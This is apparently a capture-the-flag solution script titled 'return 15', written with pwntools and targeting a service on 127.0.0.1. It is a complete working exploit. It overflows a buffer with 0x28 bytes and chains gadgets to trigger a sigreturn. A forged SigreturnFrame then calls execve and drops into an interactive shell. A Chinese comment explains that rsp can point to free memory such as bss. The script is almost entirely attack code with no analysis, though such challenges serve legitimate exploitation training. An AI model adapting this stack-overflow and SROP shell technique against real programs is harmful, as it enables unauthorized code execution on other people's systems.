# return 15

```py
from pwn import *
context.arch="amd64"
p=remote("127.0.0.1","62826")
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = 0x00402008
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = 0x404000 #rsp不一定要在传统意义的栈上，随便找个空闲地方即可，比如bss
sigframe.rip = 0x0040111c
p.sendline(b'a'*0x28+p64(0x0040110a)+p64(0x0040111c)+bytes(sigframe))
p.interactive()
```